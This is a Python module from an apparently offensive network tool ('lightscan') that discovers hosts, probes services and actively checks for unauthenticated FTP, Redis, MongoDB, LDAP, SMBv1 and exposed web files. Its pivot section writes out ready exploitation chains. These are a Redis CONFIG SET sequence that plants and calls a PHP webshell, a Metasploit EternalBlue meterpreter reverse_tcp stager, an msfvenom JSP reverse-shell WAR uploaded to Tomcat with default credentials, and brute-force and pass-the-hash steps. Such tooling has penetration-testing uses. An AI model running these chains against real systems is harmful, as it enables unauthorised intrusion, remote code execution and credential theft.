"""
Active Red-Team Engine
This is the hands-on part of the scanner — it doesn't just observe,
it actually pokes things and figures out if they're exploitable.

Four phases run in sequence, each feeding the next:

  Phase 1  Who's home?        ICMP ping, ARP table check for LAN hosts,
                               TCP-connect fallback when raw sockets aren't available.

  Phase 2  What's running?    Protocol-specific payloads per open port — not just
                               "port is open" but "this is Redis 7.2 and here's the
                               INFO dump to prove it."

  Phase 3  Is it vulnerable?  Real PoC probes: FTP anonymous login, Redis CONFIG SET,
                               MongoDB isMaster with no auth, SMBv1 negotiate,
                               LDAP anonymous bind, HTTP secret file exposure.

  Phase 4  Where do we go?    Pivot and RCE chain suggestions built from confirmed
                               vulns — Redis unauth becomes a webshell walkthrough,
                               EternalBlue gets the Metasploit stager, and so on.
"""
from __future__ import annotations

import asyncio, ipaddress, os, random, socket, ssl, struct, time, urllib.request, urllib.error
from dataclasses import dataclass, field
from typing import Dict, List, Optional

from lightscan.core.engine import ScanResult, Severity
from lightscan.scan.portscan import SERVICE_MAP, CRIT_PORTS, HIGH_PORTS, tcp_scan

# Intensity port lists
INTENSITY_PORTS: Dict[int, object] = {
    1: [21,22,23,25,80,443,445,3389,8080],
    2: [21,22,23,25,53,80,110,139,143,443,445,1433,3306,3389,5432,8080,8443],
    3: [20,21,22,23,25,53,80,110,111,135,139,143,389,443,445,512,513,514,
        1433,1521,2049,3306,3389,4443,5432,5900,6379,7001,8080,8443,9200,27017],
    4: "top1000",
    5: "all",
}

# Phase 1: Host Discovery

def _icmp_checksum(data: bytes) -> int:
    if len(data) % 2: data += b"\x00"
    s = sum((data[i] << 8) + data[i+1] for i in range(0, len(data), 2))
    s = (s >> 16) + (s & 0xFFFF); s += s >> 16
    return ~s & 0xFFFF

async def _icmp_ping(host: str, timeout: float = 1.5) -> Optional[tuple]:
    """Returns (method, rtt_ms, ttl, hostname) or None."""
    sock = None
    try:
        dst = socket.gethostbyname(host)
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.setblocking(False)
        ident = os.getpid() & 0xFFFF
        seq   = random.randint(1, 65535)
        pay   = b"lightscan"
        hdr   = struct.pack("!BBHHH", 8, 0, 0, ident, seq)
        chk   = _icmp_checksum(hdr + pay)
        pkt   = struct.pack("!BBHHH", 8, 0, chk, ident, seq) + pay
        loop  = asyncio.get_running_loop()
        t0    = time.monotonic()
        await loop.run_in_executor(None, lambda: sock.sendto(pkt, (dst, 0)))

        async def _recv():
            while True:
                try:
                    data, addr = await loop.run_in_executor(None, lambda: sock.recvfrom(1024))
                    if addr[0] != dst: continue
                    ip_hlen = (data[0] & 0x0F) * 4
                    if data[ip_hlen] == 0 and struct.unpack("!H", data[ip_hlen+4:ip_hlen+6])[0] == ident:
                        ttl = data[8]
                        rtt = round((time.monotonic() - t0) * 1000, 2)
                        hn = ""
                        try: hn = socket.gethostbyaddr(dst)[0]
                        except Exception: pass
                        return ("icmp", rtt, ttl, hn)
                except OSError: break
            return None

        result = await asyncio.wait_for(_recv(), timeout=timeout)
        return result
    except PermissionError:
        return await _tcp_ping(host, 80, timeout)
    except Exception:
        return None
    finally:
        if sock:
            try: sock.close()
            except Exception: pass

async def _tcp_ping(host: str, port: int = 80, timeout: float = 1.5) -> Optional[tuple]:
    t0 = time.monotonic()
    try:
        _, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
        rtt = round((time.monotonic() - t0) * 1000, 2)
        try: w.close(); await w.wait_closed()
        except Exception: pass
        hn = ""
        try: hn = socket.gethostbyaddr(host)[0]
        except Exception: pass
        return ("tcp-connect", rtt, 0, hn)
    except Exception:
        return None

async def _arp_check(host: str) -> Optional[tuple]:
    """Read /proc/net/arp for LAN hosts — zero packets sent."""
    try:
        if not ipaddress.ip_address(host).is_private:
            return None
        loop = asyncio.get_running_loop()
        def _read():
            try:
                with open("/proc/net/arp") as f:
                    for ln in f:
                        p = ln.split()
                        if p and p[0] == host and len(p) > 2 and p[2] != "0x0":
                            return True
            except Exception: pass
            return False
        if await loop.run_in_executor(None, _read):
            return ("arp", 0.1, 0, "")
    except Exception: pass
    return None

async def discover_hosts(targets: List[str], timeout: float = 1.5,
                         concurrency: int = 256) -> List[tuple]:
    """Returns list of (ip, method, rtt_ms, ttl, hostname) for live hosts."""
    sem  = asyncio.Semaphore(concurrency)
    live = []

    async def _probe(host: str):
        async with sem:
            r = (await _arp_check(host) or
                 await _icmp_ping(host, timeout) or
                 await _tcp_ping(host, 80, timeout) or
                 await _tcp_ping(host, 443, timeout))
            if r:
                live.append((host,) + r)

    await asyncio.gather(*[_probe(t) for t in targets])
    return live

# Phase 2: Deep Service Probing

_PROTO_PROBES: Dict[int, bytes] = {
    21:    b"",                                         # FTP banner on connect
    22:    b"SSH-2.0-LightScan_2.0\r\n",
    25:    b"EHLO redteam.local\r\nVRFY root\r\n",
    80:    b"GET / HTTP/1.0\r\nHost: x\r\n\r\n",
    110:   b"",                                         # POP3 banner
    143:   b"A001 CAPABILITY\r\n",
    389:   bytes([0x30,0x0c,0x02,0x01,0x01,0x60,0x07,0x02,0x01,0x03,0x04,0x00,0x80,0x00]),
    443:   b"GET / HTTP/1.0\r\nHost: x\r\n\r\n",
    445:   bytes([0x00,0x00,0x00,0x54,0xFF,0x53,0x4D,0x42,0x72,0x00,0x00,0x00,0x00,0x18,
                  0x53,0xC8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFF,0xFE,
                  0x00,0x00,0x00,0x00,0x00,0x31,0x00,0x02,0x4C,0x41,0x4E,0x4D,0x41,0x4E,
                  0x31,0x2E,0x30,0x00,0x02,0x4C,0x4D,0x31,0x2E,0x32,0x58,0x30,0x30,0x32,
                  0x00,0x02,0x4E,0x54,0x20,0x4C,0x41,0x4E,0x4D,0x41,0x4E,0x20,0x31,0x2E,
                  0x30,0x00,0x02,0x4E,0x54,0x20,0x4C,0x4D,0x20,0x30,0x2E,0x31,0x32,0x00]),
    3306:  b"",                                         # MySQL greeting
    3389:  bytes([0x03,0x00,0x00,0x13,0x0e,0xe0,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x08,
                  0x00,0x03,0x00,0x00,0x00]),
    5432:  bytes([0x00,0x00,0x00,0x08,0x04,0xd2,0x16,0x2f]),
    6379:  b"*1\r\n$4\r\nINFO\r\n",
    8080:  b"GET / HTTP/1.0\r\nHost: x\r\n\r\n",
    8443:  b"GET / HTTP/1.0\r\nHost: x\r\n\r\n",
    9200:  b"GET / HTTP/1.0\r\nHost: x\r\n\r\n",
    27017: bytes([0x3a,0x00,0x00,0x00,0xd4,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0xd4,0x07,
                  0x00,0x00,0x00,0x00,0x00,0x00,0x61,0x64,0x6d,0x69,0x6e,0x2e,0x24,0x63,
                  0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0x13,0x00,0x00,
                  0x00,0x10,0x69,0x73,0x4d,0x61,0x73,0x74,0x65,0x72,0x00,0x01,0x00,0x00,0x00,0x00]),
}

async def deep_probe(host: str, port: int, timeout: float = 3.0) -> dict:
    """Returns {service, banner, version, product, os, devtype, info} via protocol-specific probing."""
    import re
    service = SERVICE_MAP.get(port, f"port/{port}")
    banner  = ""
    raw     = b""
    probe   = _PROTO_PROBES.get(port, b"")

    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
        try: raw += await asyncio.wait_for(r.read(512), timeout=1.0)
        except asyncio.TimeoutError: pass
        if probe:
            w.write(probe); await w.drain()
            try: raw += await asyncio.wait_for(r.read(2048), timeout=2.0)
            except asyncio.TimeoutError: pass
        try: w.close(); await w.wait_closed()
        except Exception: pass
        banner = raw.decode("utf-8", errors="replace").strip()[:400]
    except Exception:
        pass

    # real nmap-service-probes signature matching first - ~1200 real
    # probes' worth of product/version/os/device-type instead of a
    # handful of hand-picked regexes. port-scoped so a loosely-specific
    # pattern from an unrelated service can't cross-match (see
    # fingerprint.py). falls through to the old regex list below if
    # nothing in the db matched, so this never regresses what already
    # worked - it only adds coverage.
    product = os_hint = devtype = info = ""
    ver = ""
    if raw:
        try:
            from lightscan.scan.fingerprint import get_db
            sig = get_db().match(raw, port)
            if sig:
                service = sig.service
                ver     = sig.version
                product = sig.product
                os_hint = sig.os
                devtype = sig.devtype
                info    = sig.info
        except Exception:
            pass  # bad regex in the db, missing data file, whatever - just fall through

    if not ver:
        for pat in [r"OpenSSH[_\s]([\d\.p]+)", r"Apache[/\s]([\d\.]+)", r"nginx[/\s]([\d\.]+)",
                    r"Microsoft-IIS[/\s]([\d\.]+)", r"vsftpd\s([\d\.]+)", r"MySQL\s([\d\.]+)",
                    r"redis_version:([\d\.]+)", r"MongoDB\s([\d\.]+)", r"([\d]+\.[\d]+\.[\d]+)"]:
            m = re.search(pat, banner, re.IGNORECASE)
            if m: ver = m.group(1); break

    return {"service": service, "banner": banner, "version": ver,
            "product": product, "os": os_hint, "devtype": devtype, "info": info}

# Phase 3: Vulnerability Validation

_PORT_VALIDATORS: dict[int, list[callable]] = {}

def register_validator(ports: int | list[int]):
    def decorator(func):
        p_list = [ports] if isinstance(ports, int) else list(ports)
        for p in p_list:
            _PORT_VALIDATORS.setdefault(p, []).append(func)
        return func
    return decorator

@register_validator(21)
async def _check_ftp_anon(host, port, timeout) -> Optional[ScanResult]:
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
        await asyncio.wait_for(r.read(256), timeout=1.5)
        w.write(b"USER anonymous\r\n"); await w.drain()
        resp = await asyncio.wait_for(r.read(256), timeout=1.5)
        if b"331" in resp or b"230" in resp:
            w.write(b"PASS anon@\r\n"); await w.drain()
            resp2 = await asyncio.wait_for(r.read(256), timeout=1.5)
            w.close()
            if b"230" in resp2:
                return ScanResult("active:ftp", host, port, "VULN", Severity.HIGH,
                    "FTP anonymous login ALLOWED",
                    {"attack":"ftp-anon","next":["LIST","GET sensitive files","upload webshell"]})
        try: w.close()
        except Exception: pass
    except Exception: pass
    return None

@register_validator(6379)
async def _check_redis_unauth(host, port, timeout) -> Optional[ScanResult]:
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
        w.write(b"*1\r\n$4\r\nINFO\r\n"); await w.drain()
        data = await asyncio.wait_for(r.read(512), timeout=2.0)
        w.close()
        if b"redis_version" in data:
            import re
            ver = (re.search(rb"redis_version:([^\r\n]+)", data) or [b"",b""])[1]
            ver = ver.decode() if isinstance(ver, bytes) else ""
            return ScanResult("active:redis", host, port, "VULN", Severity.CRITICAL,
                f"Redis UNAUTHENTICATED — v{ver}",
                {"attack":"redis-rce","version":ver,
                 "next":["CONFIG SET dir /var/www/html",
                         "CONFIG SET dbfilename shell.php",
                         "SET x '<?php system($_GET[c]);?>'",
                         "BGSAVE → webshell"]})
    except Exception: pass
    return None

@register_validator(27017)
async def _check_mongo_unauth(host, port, timeout) -> Optional[ScanResult]:
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
        probe = bytes([0x3a,0x00,0x00,0x00,0xd4,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0xd4,0x07,
                       0x00,0x00,0x00,0x00,0x00,0x00,0x61,0x64,0x6d,0x69,0x6e,0x2e,0x24,0x63,
                       0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0x13,0x00,0x00,
                       0x00,0x10,0x69,0x73,0x4d,0x61,0x73,0x74,0x65,0x72,0x00,0x01,0x00,0x00,0x00,0x00])
        w.write(probe); await w.drain()
        data = await asyncio.wait_for(r.read(512), timeout=2.0)
        w.close()
        if data and len(data) > 16:
            return ScanResult("active:mongodb", host, port, "VULN", Severity.CRITICAL,
                "MongoDB UNAUTHENTICATED access",
                {"attack":"mongo-unauth","next":["db.adminCommand({listDatabases:1})","db.users.find()"]})
    except Exception: pass
    return None

@register_validator(445)
async def _check_smb_v1(host, port, timeout) -> Optional[ScanResult]:
    _NEG = bytes([0x00,0x00,0x00,0x54,0xFF,0x53,0x4D,0x42,0x72,0x00,0x00,0x00,0x00,0x18,
                  0x53,0xC8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFF,0xFE,
                  0x00,0x00,0x00,0x00,0x00,0x31,0x00,0x02,0x4C,0x41,0x4E,0x4D,0x41,0x4E,
                  0x31,0x2E,0x30,0x00,0x02,0x4C,0x4D,0x31,0x2E,0x32,0x58,0x30,0x30,0x32,
                  0x00,0x02,0x4E,0x54,0x20,0x4C,0x41,0x4E,0x4D,0x41,0x4E,0x20,0x31,0x2E,
                  0x30,0x00,0x02,0x4E,0x54,0x20,0x4C,0x4D,0x20,0x30,0x2E,0x31,0x32,0x00])
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
        w.write(_NEG); await w.drain()
        data = await asyncio.wait_for(r.read(256), timeout=2.0)
        w.close()
        if len(data) >= 36 and data[4:8] == b"\xFF\x53\x4D\x42":
            return ScanResult("active:smb", host, port, "VULN", Severity.CRITICAL,
                "SMBv1 ENABLED — EternalBlue (MS17-010) candidate",
                {"attack":"eternalblue","cve":"CVE-2017-0144",
                 "next":["Run --cve --cve-list eternalblue",
                         "msf: exploit/windows/smb/ms17_010_eternalblue"]})
    except Exception: pass
    return None

@register_validator([389, 636])
async def _check_ldap_anon(host, port, timeout) -> Optional[ScanResult]:
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
        w.write(bytes([0x30,0x0c,0x02,0x01,0x01,0x60,0x07,0x02,0x01,0x03,0x04,0x00,0x80,0x00]))
        await w.drain()
        data = await asyncio.wait_for(r.read(256), timeout=2.0)
        w.close()
        if data and b"\x0a\x01\x00" in data:
            return ScanResult("active:ldap", host, port, "VULN", Severity.HIGH,
                "LDAP anonymous bind ALLOWED",
                {"attack":"ldap-anon",
                 "next":[f"ldapsearch -x -H ldap://{host}","enumerate users/groups/OUs",
                         "extract hashes"]})
    except Exception: pass
    return None

@register_validator(23)
async def _check_telnet(host, port, timeout) -> Optional[ScanResult]:
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
        data = await asyncio.wait_for(r.read(256), timeout=1.5)
        w.close()
        if data:
            return ScanResult("active:telnet", host, port, "EXPOSED", Severity.CRITICAL,
                "Telnet OPEN — plaintext protocol, credential sniffable",
                {"attack":"telnet-brute",
                 "next":["--brute telnet -U admin,root -W common","MITM credential capture"]})
    except Exception: pass
    return None

async def _check_http_exposures(host, port, timeout) -> List[ScanResult]:
    results   = []
    scheme    = "https" if port in (443, 8443, 9443) else "http"
    loop      = asyncio.get_running_loop()
    ctx       = None
    if scheme == "https":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

    PATHS = [
        ("/.env",           Severity.CRITICAL, "env-exposed",      "Extract DB_PASSWORD/API keys"),
        ("/.git/HEAD",      Severity.HIGH,     "git-exposed",      "git-dumper → source + secrets"),
        ("/wp-login.php",   Severity.MEDIUM,   "wordpress",        "--brute http → admin panel"),
        ("/manager/html",   Severity.CRITICAL, "tomcat-manager",   "Deploy WAR webshell → RCE"),
        ("/admin",          Severity.HIGH,     "admin-panel",      "Default creds: admin/admin"),
        ("/phpinfo.php",    Severity.HIGH,     "phpinfo",          "Enumerate PHP config/paths"),
        ("/actuator/env",   Severity.CRITICAL, "spring-actuator",  "GET /actuator/heapdump → RCE"),
        ("/console",        Severity.CRITICAL, "dev-console",      "REPL RCE without auth"),
        ("/.DS_Store",      Severity.MEDIUM,   "ds-store",         "Enumerate directory tree"),
    ]

    async def _check(path, sev, attack, hint):
        url = f"{scheme}://{host}:{port}{path}"
        def _req():
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                kw  = {"context": ctx} if ctx else {}
                with urllib.request.urlopen(req, timeout=timeout, **kw) as resp:
                    return resp.status
            except urllib.error.HTTPError as e: return e.code
            except Exception: return 0

        code = await loop.run_in_executor(None, _req)
        if code in (200, 301, 302, 403):
            results.append(ScanResult("active:http", host, port, "EXPOSED", sev,
                f"{attack} HTTP {code} — {url}",
                {"attack": attack, "url": url, "status": code, "next": hint}))

    await asyncio.gather(*[_check(*p) for p in PATHS])
    return results

# Validator dispatch

_HTTP_PORTS = {80, 443, 8000, 8080, 8443, 8888, 3000, 5000, 9090}

async def validate_port(host: str, port: int, timeout: float) -> List[ScanResult]:
    out = []
    funcs  = _PORT_VALIDATORS.get(port, [])
    for fn in funcs:
        try:
            r = await fn(host, port, timeout)
            if r: out.append(r)
        except Exception:
            pass
    if port in _HTTP_PORTS:
        out.extend(await _check_http_exposures(host, port, timeout))
    return out

# Phase 4: Pivot suggestions

def pivot_suggestions(host: str, open_ports: List[int],
                      vulns: List[ScanResult]) -> List[ScanResult]:
    out     = []
    attacks = {r.data.get("attack","") for r in vulns if r.data}

    _PIVOTS = [
        (445,  Severity.HIGH,     "smb-pivot",
         "SMB → internal network pivot",
         [f"smbclient -L //{host} -U guest", f"impacket-smbclient {host}"]),
        (3389, Severity.HIGH,     "rdp-lateral",
         "RDP → lateral movement / pass-the-hash",
         [f"lightscan --rdp-probe {host}", f"--brute rdp -t {host} -U administrator -W common"]),
        (22,   Severity.MEDIUM,   "ssh-tunnel",
         "SSH → SOCKS proxy / reverse tunnel pivot",
         [f"ssh -D 1080 user@{host}", f"--brute ssh -t {host} -U root,admin -W common --mutate"]),
        (5985, Severity.HIGH,     "winrm-lateral",
         "WinRM → remote command execution",
         [f"evil-winrm -i {host} -u administrator -p PASSWORD"]),
        (1433, Severity.HIGH,     "mssql-lateral",
         "MSSQL → xp_cmdshell → OS command execution",
         [f"--brute mssql -t {host} -U sa -W common", "xp_cmdshell → shell"]),
    ]
    for port, sev, vector, detail, cmds in _PIVOTS:
        if port in open_ports:
            out.append(ScanResult("active:pivot", host, port, "PIVOT", sev,
                detail, {"vector": vector, "commands": cmds}))

    if "redis-rce" in attacks:
        out.append(ScanResult("active:pivot", host, 6379, "RCE_CHAIN", Severity.CRITICAL,
            "Redis unauth → file write → webshell RCE",
            {"vector":"redis-rce", "chain":[
                f"redis-cli -h {host} CONFIG SET dir /var/www/html",
                f"redis-cli -h {host} CONFIG SET dbfilename cmd.php",
                f"redis-cli -h {host} SET x '<?php system($_GET[c]);?>'",
                f"redis-cli -h {host} BGSAVE",
                f"curl http://{host}/cmd.php?c=id"]}))

    if "eternalblue" in attacks:
        out.append(ScanResult("active:pivot", host, 445, "RCE_CHAIN", Severity.CRITICAL,
            "MS17-010 → SYSTEM shell",
            {"vector":"eternal-blue-rce", "chain":[
                "use exploit/windows/smb/ms17_010_eternalblue",
                f"set RHOSTS {host}",
                "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
                "run"]}))

    if "tomcat-manager" in attacks:
        out.append(ScanResult("active:pivot", host, 8080, "RCE_CHAIN", Severity.CRITICAL,
            "Tomcat Manager → WAR deploy → RCE",
            {"vector":"tomcat-war","chain":[
                "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=4444 -f war -o s.war",
                f"curl -u tomcat:tomcat http://{host}:8080/manager/text/deploy?path=/s --upload-file s.war",
                f"curl http://{host}:8080/s/"]}))

    # everything above is a hand-built chain for one specific attack. below
    # catches whatever's left with a 'next' hint sitting in its data that
    # nothing above already surfaced - ftp-anon/mongo-unauth/ldap-anon/
    # telnet-brute all set one and used to just get dropped on the floor,
    # and now cve templates can carry their own pivot: block and land here
    # too instead of needing a hardcoded case added per template.
    _handled = {"redis-rce", "eternalblue", "tomcat-manager"}
    seen = set()
    for r in vulns:
        if not r.data:
            continue
        vector = r.data.get("attack") or r.data.get("template_id", "")
        next_steps = r.data.get("next")
        if not next_steps or vector in _handled or vector in seen:
            continue
        seen.add(vector)
        out.append(ScanResult("active:pivot", host, r.port, "PIVOT", r.severity,
            f"{r.detail.split('[')[0].strip()} → next steps",
            {"vector": vector, "commands": next_steps}))

    return out

# Main active pipeline

async def active_scan(
    targets:     List[str],
    ports:       Optional[List[int]] = None,
    timeout:     float = 3.0,
    concurrency: int   = 256,
    intensity:   int   = 3,
    verbose:     bool  = False,
    skip_discovery: bool = False,
    mode:        str   = "deep",
) -> List[ScanResult]:
    """
    Full 4-phase active red-team pipeline.
    Returns all ScanResult objects (discovery + open ports + vulns + pivots).
    """
    results: List[ScanResult] = []
    C = "\033[38;5;196m"; R = "\033[0m"; G = "\033[38;5;82m"; DIM = "\033[38;5;240m"

    # Phase 1 ─ Discovery
    if not skip_discovery:
        print(f"\n{C}⚡{R} \033[1m[PHASE 1] HOST DISCOVERY\033[0m \033[38;5;240m({len(targets)} targets)\033[0m")
        live = await discover_hosts(targets, timeout=min(timeout, 1.5), concurrency=concurrency)
        live_ips = []
        for ip, method, rtt, ttl, hn in live:
            live_ips.append(ip)
            tag = f" ({hn})" if hn else ""
            print(f"  {G}✔ ALIVE{R}  {ip:<18}{tag:<22} [{method}] rtt={rtt}ms ttl={ttl}")
            results.append(ScanResult("active:discovery", ip, 0, "alive", Severity.INFO,
                f"Host alive via {method} rtt={rtt}ms",
                {"method":method,"rtt_ms":rtt,"ttl":ttl,"hostname":hn}))
        if not live_ips:
            print(f"{DIM}  [!] No hosts discovered — scanning all targets (ICMP may be blocked){R}")
            live_ips = targets
    else:
        live_ips = targets

    # Phase 2 ─ Port scan
    spec = ports
    if spec is None:
        raw_spec = INTENSITY_PORTS.get(intensity, INTENSITY_PORTS[3])
        if isinstance(raw_spec, list):
            spec = raw_spec
        else:
            from lightscan.core.target import parse_ports
            spec = parse_ports(raw_spec)

    print(f"\n{C}⚡{R} \033[1m[PHASE 2] PORT SCANNING\033[0m \033[38;5;240m({len(live_ips)} host(s) × {len(spec)} ports)\033[0m")
    open_map: Dict[str, List[int]] = {}
    sem = asyncio.Semaphore(concurrency)

    async def _scan(h, p):
        async with sem:
            r = await tcp_scan(h, p, timeout, grab_banner=True)
            if r and r.status == "open":
                open_map.setdefault(h, []).append(p)
                if verbose:
                    print(f"  {C}✚ OPEN{R}  {h}:{p:<6} {r.detail}")
                results.append(r)

    await asyncio.gather(*[_scan(h, p) for h in live_ips for p in spec])
    total_open = sum(len(v) for v in open_map.values())
    print(f"  {C}➥{R} {total_open} open port(s) on {len(open_map)} host(s)")

    if mode == "sweep":
        print(f"\n{C}⚡{R} \033[1m[SWEEP COMPLETED]\033[0m {len(results)} host/port finding(s)\n")
        return results

    # Phase 3 ─ Service probing
    print(f"\n{C}⚡{R} \033[1m[PHASE 3] DEEP SERVICE PROBING\033[0m")
    for host, plist in open_map.items():
        tasks = [deep_probe(host, p, timeout) for p in plist]
        probed = await asyncio.gather(*tasks, return_exceptions=True)
        for p, pr in zip(plist, probed):
            if isinstance(pr, dict) and (pr["version"] or pr["banner"]):
                svc = pr["service"]
                ver = pr.get("version","")
                product = pr.get("product","")
                label = f"{product} {ver}".strip() if product else f"{svc} {ver}".strip()
                extra = f" — {pr['os']}" if pr.get("os") else ""
                print(f"  \033[38;5;117m◈ [SVC]{R} {host}:{p} {label}{extra}")
                results.append(ScanResult("active:service", host, p, "detected", Severity.INFO,
                    f"{label} — {pr['banner'][:80]}",
                    {"service":svc,"version":ver,"banner":pr["banner"][:200],
                     "product":product,"os":pr.get("os",""),"devtype":pr.get("devtype",""),
                     "info":pr.get("info","")}))

    # Phase 4 ─ Vuln validation
    print(f"\n{C}⚡{R} \033[1m[PHASE 4] VULNERABILITY VALIDATION\033[0m")
    vuln_map: Dict[str, List[ScanResult]] = {}

    async def _validate(h, p):
        vulns = await validate_port(h, p, timeout)
        if vulns:
            vuln_map.setdefault(h, []).extend(vulns)
            results.extend(vulns)
            for v in vulns:
                col = C if v.severity == Severity.CRITICAL else "\033[38;5;208m"
                print(f"  {col}☣ [{v.severity.value}]{R} {v.module} {v.target}:{v.port} — {v.detail[:80]}")

    await asyncio.gather(*[_validate(h, p) for h, pl in open_map.items() for p in pl])

    # Phase 5 ─ Pivot map
    print(f"\n{C}⚡{R} \033[1m[PHASE 5] PIVOT & EXPLOIT CHAINS\033[0m")
    for host, plist in open_map.items():
        for pv in pivot_suggestions(host, plist, vuln_map.get(host, [])):
            results.append(pv)
            chain = pv.data.get("chain") or pv.data.get("commands",[])
            print(f"  \033[38;5;208m➦ [PIVOT]{R} {pv.target} — {pv.detail}")
            for step in chain[:3]:
                print(f"    {DIM}↳ {step}{R}")

    crit = sum(1 for r in results if r.severity == Severity.CRITICAL)
    high = sum(1 for r in results if r.severity == Severity.HIGH)
    print(f"\n{C}⚡{R} \033[1m[ACTIVE SCAN COMPLETE]\033[0m {len(results)} findings | {C}{crit} CRITICAL{R} | {high} HIGH\n")
    return results
